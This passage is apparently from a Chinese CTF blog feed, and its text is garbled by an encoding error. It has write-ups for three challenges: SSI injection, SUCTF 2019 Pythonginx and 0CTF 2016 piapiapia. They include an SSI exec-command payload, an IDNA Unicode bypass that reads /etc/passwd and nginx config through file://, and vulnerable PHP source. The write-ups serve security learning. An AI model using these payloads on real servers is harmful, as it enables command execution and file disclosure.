class="variable">$file_shtml</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line">            <span class="variable">$text</span> = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">***&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$shtml</span>,<span class="variable">$text</span>);</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$shtml</span>);</span><br><span class="line">            ***</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;[!] Header  error ...&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">***</span><br><span class="line">    &#125;</span><br><span class="line">***</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¦æ±‚passwordçš„md5å€¼çš„å‰6ä¸ªå­—ç¬¦ä¸º6d0bc1ã€‚æ•²ä»£ç ï¼ˆpythonï¼‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000000</span>):</span><br><span class="line">    <span class="keyword">if</span> md5(<span class="built_in">str</span>(i).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()[:<span class="number">6</span>] == <span class="string">&#x27;6d0bc1&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230410201840174.png" alt="image-20230410201840174"></p><p>å‘ç°ä¸‰ä¸ªæ•°å­—å¯ä»¥æ˜¯</p><p>ç„¶åè¿›è¡Œç™»å½•</p><p><img src="../images/image-20230410201946697.png" alt="image-20230410201946697"></p><p>ç™»å½•æˆåŠŸ</p><p><img src="../images/image-20230410202019909.png" alt="image-20230410202019909"></p><p>å‘ç°è¯·æ±‚å¤´æœ‰ä¸ªç©æ„</p><p><img src="../images/image-20230410202059718.png" alt="image-20230410202059718"></p><p>è¿™é‡Œæœ‰ä¸ªshtmlçš„ç©æ„</p><p>ï¼ˆshtmlæ˜¯ä¸€ç§åŸºäºSSIæŠ€æœ¯çš„æ–‡ä»¶ã€‚SSI æ³¨å…¥å…¨ç§°Server-Side Includes Injectionï¼Œå³æœåŠ¡ç«¯åŒ…å«æ³¨å…¥ã€‚SSI æ˜¯ç±»ä¼¼äº CGIï¼Œç”¨äºåŠ¨æ€é¡µé¢çš„æŒ‡ä»¤ã€‚SSI æ³¨å…¥å…è®¸è¿œç¨‹åœ¨ Web åº”ç”¨ä¸­æ³¨å…¥è„šæœ¬æ¥æ‰§è¡Œä»£ç ã€‚SSIæ˜¯åµŒå…¥HTMLé¡µé¢ä¸­çš„æŒ‡ä»¤ï¼Œåœ¨é¡µé¢è¢«æä¾›æ—¶ç”±æœåŠ¡å™¨è¿›è¡Œè¿ç®—ï¼Œä»¥å¯¹ç°æœ‰HTMLé¡µé¢å¢åŠ åŠ¨æ€ç”Ÿæˆçš„å†…å®¹ï¼Œè€Œæ— é¡»é€šè¿‡CGIç¨‹åºæä¾›å…¶æ•´ä¸ªé¡µé¢ï¼Œæˆ–è€…ä½¿ç”¨å…¶ä»–åŠ¨æ€æŠ€æœ¯ã€‚ä»æŠ€æœ¯è§’åº¦ä¸Šæ¥è¯´ï¼ŒSSIå°±æ˜¯åœ¨HTMLæ–‡ä»¶ä¸­ï¼Œå¯ä»¥é€šè¿‡æ³¨é‡Šè¡Œè°ƒç”¨çš„å‘½ä»¤æˆ–æŒ‡é’ˆï¼Œå³å…è®¸é€šè¿‡åœ¨HTMLé¡µé¢æ³¨å…¥è„šæœ¬æˆ–è¿œç¨‹æ‰§è¡Œä»»æ„ä»£ç ã€‚IISå’ŒApacheéƒ½å¯ä»¥å¼€å¯SSIåŠŸèƒ½ï¼‰</p><p>ï¼ˆSSIæ³¨å…¥çš„æ¡ä»¶ï¼š</p><p>1.Web æœåŠ¡å™¨å·²æ”¯æŒSSIï¼ˆæœåŠ¡å™¨ç«¯åŒ…å«ï¼‰</p><p>2.Web åº”ç”¨ç¨‹åºæœªå¯¹å¯¹ç›¸å…³SSIå…³é”®å­—åšè¿‡æ»¤</p><p>3.Web åº”ç”¨ç¨‹åºåœ¨è¿”å›å“åº”çš„HTMLé¡µé¢æ—¶ï¼ŒåµŒå…¥ç”¨æˆ·è¾“å…¥ï¼‰</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd=&quot;å‘½ä»¤&quot;--&gt;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230410202410577.png" alt="image-20230410202410577"></p><p>è¿™é‡Œå°±æ˜¯shtmlçš„æ³¨å…¥ç‚¹äº†ï¼Œæ‰€ä»¥usernameå°±æ˜¯æ³¨å…¥ç‚¹äº†</p><p>(ä¹Ÿå¯ä»¥è¿™æ ·æƒ³ï¼Œåªæœ‰ä¸¤ä¸ªå‚æ•°å¯æ§ï¼Œpasswdå·²ç»å®šæ­»äº†ï¼Œé‚£ä¹ˆå°±åªå‰©usernameå¯ç”¨äº†)</p><p><img src="../images/image-20230410202836563.png" alt="image-20230410202836563"></p><p><img src="../images/image-20230410202858401.png" alt="image-20230410202858401"></p><p>è¿™é‡Œçš„è¯æ˜¯ä¸€ä¸‹ä¸€ä¸‹ç»™è¯•å‡ºæ¥çš„</p><p>åˆ†æä¸€ä¸‹ä»£ç é€»è¾‘å°±çŸ¥é“å’‹åšäº†</p><h2 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230410203011922.png" alt="image-20230410203011922"></p><p>ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getUrl&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getUrl</span>():</span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;æˆ‘æ‰Œ your problem? 111&quot;</span></span><br><span class="line">    parts = <span class="built_in">list</span>(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;æˆ‘æ‰Œ your problem? 222 &quot;</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>.join(newhost)</span><br><span class="line">    <span class="comment">#å»æ‰ url ä¸­çš„ç©ºæ ¼</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;æˆ‘æ‰Œ your problem? 333&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230410212124359.png" alt="image-20230410212124359"></p><p><strong>è¿™é‡Œçœ‹ä¸å¤ªæ‡‚å°±ç›´æ¥æŠŠä»£ç åˆ†ç¦»å‡ºæ¥çœ‹</strong></p><p>åˆ©ç”¨ç‚¹åœ¨è¿™é‡Œ<code>urllib.request.urlopen(finalUrl).read()</code>ï¼Œåªè¦å‰ä¸¤æ¬¡<code>host != suctf.cc</code>ï¼Œç¬¬ä¸‰æ¬¡<code>host == suctf.cc</code>å³å¯</p><p><img src="../images/image-20230410212924771.png" alt="image-20230410212924771"></p><p>è€Œè¿™åˆ©ç”¨çš„å…³é”®åœ¨äº<code>newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))</code></p><p>ç¼–ç é—®é¢˜ï¼Œ<code>Unicode</code>çš„å¾ˆå¤šå­—ç¬¦ç»è¿‡è¿™æ ·çš„ä¸€ç•ªç¼–ç å¤„ç†éƒ½å¯ä»¥å¾—åˆ°æ­£å¸¸çš„å­—æ¯ï¼Œè„šæœ¬<strong>fuzz</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">chars = [<span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;f&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> chars:</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x7f</span>, <span class="number">0x10FFFF</span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">char_i = <span class="built_in">chr</span>(i).encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> char_i == c:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ASCII: &#123;&#125;   Unicode: &#123;&#125;    Number: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(c, <span class="built_in">chr</span>(i), i))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230410213251760.png" alt="image-20230410213251760"></p><p>è¿™é‡Œçš„æ„æ€å°±æ˜¯å‰ä¸¤ä¸ªæ²¡æœ‰è¿›è¡Œè¿™ä¸ªç¼–ç ï¼Œç„¶åç¬¬ä¸‰ä¸ªä¹‹å‰å°±æœ‰ä¸€ä¸ªç¼–ç ï¼Œç„¶åå°±ä¼šæŠŠåŸæœ¬çš„unicodeç¼–ç ç»™å˜æˆæ­£å¸¸çš„ç¼–ç äº†</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/getUrl?url=file://ğ‘†uctf.cc/etc/passwd</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230410213759184.png" alt="image-20230410213759184"></p><p>ç„¶åå°±æ˜¯æ‰¾flagä½ç½®äº†</p><p><img src="../images/image-20230410213807929.png" alt="image-20230410213807929"></p><p>ç»™äº†æç¤ºï¼Œç„¶åå°±å°è¯•è®¿é—®nginxè¿™ä¸ªé…ç½®æ–‡ä»¶</p><p>Nginx<code>çš„é…ç½®æ–‡ä»¶ç½‘ä¸Šä½ç½®æœ‰å¾ˆå¤šï¼Œè¿™é‡Œèƒ½è¯»å–åˆ°çš„æ˜¯</code>/usr/local/nginx/conf/nginx.conf</p><p><img src="../images/image-20230410213928964.png" alt="image-20230410213928964"></p><p>ç„¶åå°±æ˜¯è¯»å–flagäº†</p><p><img src="../images/image-20230410214100651.png" alt="image-20230410214100651"></p><p>è¿™å°±æ˜¯éªŒè¯è¿‡ç¨‹äº†</p><h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230410214141340.png" alt="image-20230410214141340"></p><p><strong>è¿™é¢˜è€ƒå¯Ÿçš„ä¸æ˜¯sqlæ³¨å…¥</strong>   è¿™ç™»å½•æ¡†ç¡®å®æœ‰ç‚¹æ¬ºéª—çš„å‘³é“åœ¨</p><p>è¿™ä¸ªå°è¯•ä¸€ä¸‹å¸¸ç”¨çš„phpæ–‡ä»¶ï¼Œçœ‹èƒ½ä¸èƒ½è¯•å‡ºç½‘ç«™çš„ç›®å½•</p><ul><li>æ³¨å†Œè´¦å·<br>çœ‹æ¥æˆ‘ä»¬è¿˜æ˜¯å¾—è€è€å®å®å¾—æ³¨å†Œä¸ªè´¦å·æ¥ç™»å½•çœ‹çœ‹æœ‰ä»€ä¹ˆåŠŸèƒ½ç‚¹ï¼Œå¹¶ä¸”ç†Ÿæ‚‰ç½‘ç«™ç»“æ„ã€‚ä½†æ˜¯åœ¨ç™»å½•é¡µé¢åˆæ²¡æœ‰ç»™å‡ºæ³¨å†ŒæŒ‰é’®ï¼Œçœ‹æ¥æˆ‘ä»¬è¿˜å¾—è‡ªå·±çŒœä¸€ä¸‹ï¼Œé€šå¸¸æ˜¯ï¼š/register.phpã€‚</li><li>æµè§ˆåŠŸèƒ½<br>ç™»å½•æˆåŠŸåæˆ‘ä»¬çœ‹åˆ°æ˜¯ä¸€ä¸ªä¸Šä¼ ä¸ªäººä¿¡æ¯çš„ä¸€ä¸ªé¡µé¢ï¼Œçœ‹åˆ°å¯ä»¥ä¸Šä¼ å›¾ç‰‡ï¼Œç¬¬ä¸€æ—¶é—´å°±æƒ³åˆ°äº†æ–‡ä»¶ä¸Šä¼ æ¼æ´ã€‚æˆ‘è¿˜æ˜¯å¤ªå¹´è½»äº†ï¼Œä¸€æ³¢æ“ä½œåæ²¡æœ‰é¥¶å¾—è¿‡ã€‚ä¸Šä¼ äº†ä¸€ä¸ªæ­£å¸¸çš„ä¿¡æ¯ï¼Œå‘ç°è·³è½¬åˆ°profile.phpå±•ç¤ºå‡ºæ¥æˆ‘ä»¬çš„ä¿¡æ¯</li><li>ç›®å½•æ‰«é¢<br>åŠŸèƒ½éƒ½è¯•è¿‡äº†ï¼Œæ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„åœ°æ–¹ï¼ˆæ˜¯æˆ‘å¤ªèœï¼‰ã€‚æˆ‘ä»¬å¯ä»¥æ‰«ä¸€ä¸‹ç›®å½•ï¼Œçœ‹çœ‹æœ‰ä»€ä¹ˆéšè—çš„æ–‡ä»¶å‘€ï¼Œä¿¡æ¯æ³„éœ²ä»€ä¹ˆçš„ï¼Œæ¯•ç«ŸCTFå¾ˆå¤šé¢˜å‹æ˜¯ä¿¡æ¯æ³„éœ²+ä»£ç å®¡è®¡å˜›ã€‚æ‹¿å‡ºå¾¡å‰‘æ‰«æåï¼Œæµè§ˆç½‘é¡µå‘ç°è®¿é—®å¤ªå¿«äº†ï¼Œè¿”å›429çŠ¶æ€ç ã€‚çœ‹äº†ç½‘ä¸Šå¤§ä½¬ä»¬çš„Writeupå‘ç°dirsearchå¯ä»¥æ‰«æå‡ºæ¥www.zipï¼Œæˆ‘è¯•äº†ä¸‹dirsearchè¦è®°å¾—åŠ å»¶æ—¶å‚æ•°ã€‚<br>æ‹¿åˆ°äº†ç½‘ç«™çš„æºç æˆ‘ä»¬çš„ä¿¡æ¯æ”¶é›†å·®ä¸å¤šå°±å®Œäº†,æˆ‘ä»¬ç°åœ¨å¯ä»¥åœ¨æºç ä¸­å¯»æ‰¾çªç ´ç‚¹</li></ul><p><img src="../images/image-20230411194146010.png" alt="image-20230411194146010"></p><p>è¿™æ˜¯æ³¨å†Œå®Œç™»å½•çš„ç•Œé¢</p><p>æŸ¥çœ‹æ‰«å‡ºæ¥çš„ç½‘ç«™ç›®å½•   <code>www.zip</code>   å¾—åˆ°ä¸‹é¢çš„æºç </p><p><img src="../images/image-20230411194253897.png" alt="image-20230411194253897"></p><p><strong>update.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>] &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>]) &#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid phone&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid email&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || <span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Photo size error&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;upload/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span>-&gt;<span class="title function_ invoke__">update_profile</span>(<span class="variable">$username</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$profile</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>â€ƒâ€ƒä¸€çœ¼å¯ä»¥çœ‹å‡ºè¿™é‡Œç”¨äº†ä¸€å †æ­£åˆ™è¡¨è¾¾å¼æ¥è¿‡æ»¤æˆ‘ä»¬æäº¤çš„æ•°æ®ï¼Œè€Œä¸”ç¬¬ä¸‰ä¸ªæ­£åˆ™è¡¨è¾¾å¼å’Œå‰é¢ä¸¤ä¸ªä¸ä¸€æ ·ï¼Œè¿™é‡Œåˆ¤æ–­äº†nicknameæ˜¯å¦ä¸ºå­—ç¬¦è¿˜æœ‰é•¿åº¦æ˜¯å¦è¶…è¿‡10ã€‚ç”¨æ–‡ç« å¼€å¤´çš„çŸ¥è¯†ç‚¹äºŒï¼Œå¦‚æœæˆ‘ä»¬ä¼ å…¥çš„nicknameæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œç»•è¿‡é•¿åº¦çš„é™åˆ¶ï¼Œåˆ™å¯ä»¥ç»•è¿‡è¿™æ­£åˆ™è¡¨è¾¾å¼ï¼Œæ˜¯æˆ‘ä»¬ä¸ä¼šdieå‡ºã€‚<br>â€ƒâ€ƒåœ¨ä»£ç çš„åé¢è°ƒç”¨update_profileå¤„æˆ‘ä»¬æƒ³åˆ°è¿™ä¸ªå¯èƒ½æ˜¯å°†æ•°æ®ä¿å­˜åˆ°æ•°æ®åº“ï¼Œè€Œä¸”è¿˜ç”¨äº†phpåºåˆ—åŒ–serialize()ï¼Œæˆ‘ä»¬å¯ä»¥å¤§èƒ†çš„å°è¯•ç”¨ååºåˆ—åŒ–æ¼æ´æ¥æä¸€ä¸‹ã€‚<br>â€ƒâ€ƒæˆ‘ä»¬å†çœ‹çœ‹update_profile()åˆ°åº•æ˜¯ä¸ªå•¥ï¼Œä½¿ç”¨å…¨å±€æœç´¢æˆ‘ä»¬åœ¨class.phpä¸­çœ‹åˆ°äº†å®šä¹‰çš„update_profile()æ–¹æ³•</p><p><strong>update_profile()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$new_profile</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$new_profile</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$new_profile</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">parent</span>::<span class="title function_ invoke__">update</span>(<span class="variable">$this</span>-&gt;table, <span class="string">&#x27;profile&#x27;</span>, <span class="variable">$new_profile</span>, <span class="variable">$where</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>filter()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line"><span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line"><span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>update()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$key</span>, <span class="variable">$value</span>, <span class="variable">$where</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE <span class="subst">$table</span> SET <span class="subst">$key</span> = &#x27;<span class="subst">$value</span>&#x27; WHERE <span class="subst">$where</span>&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€ƒupdate.phpæˆ‘ä»¬åŸºæœ¬ä¸Šå°±ææ¸…æ¥šäº†ï¼Œæ˜¯å…ˆç»è¿‡æ­£åˆ™è¡¨è¾¾å¼å°†ç”¨æˆ·æäº¤çš„å‚æ•°å€¼è¿‡æ»¤ï¼Œç„¶ååºåˆ—åŒ–ï¼Œç„¶åå°†éæ³•çš„å€¼æ›¿æ¢ä¸ºâ€™hackerâ€™</p><p><strong>çœ‹wpå§  è¿™é‡Œå°±ä¸å¤ªæƒ³å†™äº† </strong>      </p><p><a href="https://www.cnblogs.com/g0udan/p/12216207.html">wp</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> buuctf ç¬¬äºŒé¡µ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-æ„šäººæ¯</title>
      <link href="/posts/28e06bac.html"/>
      <url>/posts/28e06bac.html</url>
      
